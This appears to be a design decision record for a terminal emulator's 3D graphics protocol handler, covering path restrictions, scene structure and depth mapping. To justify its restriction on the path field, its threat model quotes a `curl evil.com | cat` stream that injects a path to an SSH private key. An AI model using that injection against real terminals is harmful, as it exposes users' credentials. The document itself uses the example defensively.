# RGP protocol handler

**Status:** decided
**Date:** 2026-05-23
**Scope:** protocol-handler architecture for M12 — wire parsing, asset
sourcing, scene state, and depth composition with the cell pass. Complements
[`rgp-3d-path.md`](./rgp-3d-path.md), which covers the 3D renderer library
choice (hand-rolled wgpu).

## Summary

1. **Path-based register accepts leaf names only**, resolved against an
   embedded asset bundle baked into the binary and, optionally, a user-
   configurable directory. No `std::fs::read` outside those two sources.
   We advertise `path=1` honestly because we support the field — just not as
   arbitrary filesystem access.
2. **No Bevy, no escape hatch.** `RgpScene` is a concrete struct in
   `toastty-graphics` with `&self` accessor methods only. No trait
   abstraction; no Cargo feature gates carved out for a future Bevy backend.
   This decision was made deliberately and is recorded so future work does
   not re-litigate it.
3. **Depth composition.** The cell layer renders at NDC `z = 0.5`. Protocol
   `depth=0` (the spec's default) maps to NDC `0.5` — co-planar with text.
   Protocol `depth ∈ [-10, 10]` maps to NDC `[0.0, 1.0]` (factor 0.05). A
   placement at default depth that straddles the text plane will render with
   text apparently embedded inside the object — half the text pixels pass
   the depth test, half fail. The convention is deliberately symmetric so a
   future whole-terminal 3D surface transform composes naturally.

## Decision 1: path policy (B′)

### What we ship

The `path=` field accepts a **leaf name only** (no `/`, no `\`, no `..`, no
leading `.`). The resolver tries, in order:

1. The embedded asset bundle (a small set of `include_bytes!`-baked
   `.glb` files shipped in `toastty-graphics/assets/`).
2. If `[rgp] asset_dir` is set in the user config, the leaf name joined onto
   that directory, with a final canonicalization step asserting the
   resolved path is still inside `asset_dir` (defence against symlinks
   pointing out of the dir).

Anything else — absolute paths, paths with separators, `..`, hidden files —
is rejected before any I/O. We advertise `path=1` in the support-query
reply because we *do* support the field; what we don't support is
arbitrary disk access.

### What Ratty does (and why we don't follow it)

The Ratty reference implementation (`src/model.rs::load_object_source` on
the `orhun/ratty` `main` branch) takes the opposite approach: tilde-expand
the input and, if `path.exists()`, read it directly via `std::fs::read`.
Any absolute path the terminal process can read is read. The
`object_asset_path` helper that contains some weak path-component logic is
only reached on the *fallback* branch for paths that don't exist on disk;
the existence check above it short-circuits absolute paths.

We chose not to follow this for three reasons:

1. **Escape sequences are not always authored by the running app.**
   `curl evil.com | cat` will happily dump arbitrary APC bytes onto the
   PTY. Ratty's behavior allows `path=/Users/howard/.ssh/id_rsa` from that
   stream and silently reads the file. Even if the bytes fail glTF parse,
   the read happened — and if anything that surfaces parsed content
   visually is later added (image rendering of arbitrary bytes is Sixel/
   Kitty's exact behavior), the file content leaks.
2. **`payload=` covers every legitimate use case** the app actually needs.
   An app that authored its own model bytes can send them inline. The
   only thing `path=` saves is the base64 round-trip cost for assets that
   live on disk, which is a minor optimization, not a capability.
3. **Bundled assets are the workflow** that matters for compat. Ratty
   bakes `CairoSpinyMouse.obj`, `Ferris.glb`, `SpinyMouse.glb` into its
   binary; apps written for Ratty's `path=` typically reference those
   leaf names. Supporting that workflow without supporting arbitrary
   reads gets us 90% of the compat surface at 0% of the risk.

### Asymmetry — apps can still load arbitrary models

This policy restricts `path=`, not asset content. The `payload=` source is
unrestricted: apps send whatever glTF bytes they want, base64-encoded,
optionally split across chunked register packets (`more=1` → `more=0`).
That's the intended path for "I want my app to display this 3D scene."

What's prevented is specifically the **read primitive** that an unrestricted
`path=` field would grant to any byte source on the PTY — including byte
sources the user did not write or trust.

### Bundled asset list

Treat the bundle as the publishable surface of `path=` — adding a leaf name
here is a compatibility commitment. v1 ships a small license-clean set,
TBD; one demo asset is sufficient for tests + the M12 demo script.

## Decision 2: no Bevy, scene is a struct

[`rgp-3d-path.md`](./rgp-3d-path.md) already rejected Bevy on binary-size
and RAM grounds. This decision escalates that: we don't structure code "in
case we need Bevy later." Concretely:

- `RgpScene` lives in `toastty-graphics::rgp::scene` as a concrete struct.
- All access from `toastty-render` is through `&self` methods
  (`scene.placements()`, `scene.asset(id)`, `scene.revision()`). No `pub`
  fields visible to the renderer.
- No `RgpScene` trait. No `bevy-rgp` Cargo feature. No conditional
  compilation around the scene type.

If the hand-rolled wgpu renderer ever runs out of runway for a fidelity
feature (real PBR, shadow maps, IBL, skinned animation), the options are
(a) implement it ourselves in wgpu, or (b) re-evaluate `rend3` maintenance
health. Bevy is not on the candidate list.

The accessor-only discipline still has value: it keeps the renderer from
reaching into private scene state and creating coupling that's expensive
to undo. It's good layering, not escape-hatch theatre.

## Decision 3: depth conventions

### Where the cell layer sits

Cells render at **NDC z = 0.5**, the middle of the depth buffer. Both the
text pipeline and the image pipeline (M11) write this value as a constant
vertex output `z` field, with `depth_compare: LessEqual` and
`depth_write_enabled: true`.

### How protocol depth maps to NDC

Protocol `depth` is a free-form `f32` that the spec leaves
implementation-defined. We map it as:

```
ndc_z = 0.5 + 0.05 * protocol_depth     // clamp to [0.0, 1.0]
```

So:
- `depth = 0` (the spec's default) → NDC 0.5, co-planar with text.
- `depth = -5` → NDC 0.25, halfway between camera and text.
- `depth = +5` → NDC 0.75, halfway behind text.
- `depth = ±10` saturates at the near/far plane.

Documented in the terminfo entry and in `protocols.md` so apps know what
their `depth=` numbers mean on toastty.

### Why depth=0 is co-planar with text (not in front or behind)

An object at default depth with any z-extent will *straddle* the text
plane. Text pixels in front of the object's back half pass the depth
test (text wins); text pixels behind the front half fail (object wins).
The visual effect is that text reads as embedded inside the object — a
deliberate aesthetic that distinguishes toastty's RGP behavior from
"image popped on top of terminal."

It also keeps the door open for a future whole-terminal 3D transform: if
the text layer is later rendered to an offscreen texture and projected as
a textured quad at NDC 0.5, RGP objects sitting symmetrically around that
plane compose naturally as the plane tilts/curls in world space.

## Open questions / follow-ups

- **OBJ format support.** v1 advertises `fmt=glb` only. `tobj` is small;
  add in v1.1 once the GLB path is proven and we have a real `path=`
  apparatus where users might drop `.obj` files in.
- **glTF animation channels.** v1 interprets `animate=1` as "spin slowly
  around Y" — a placeholder that the spec leaves up to implementation
  (`anim=1` capability means "default animation is supported," not "glTF
  keyframes are honored"). Real animation channels are a v2 feature when
  RGP content shipping such channels actually exists.
- **Per-frame budget cap.** If the GPU mesh cache ever holds enough
  assets to dominate RSS, add eviction policy. Defer until profiling
  shows the problem.
- **Whole-terminal 3D surface transform.** The depth conventions above
  preserve the option; the actual transform is post-M13 (user shaders)
  work, not M12.
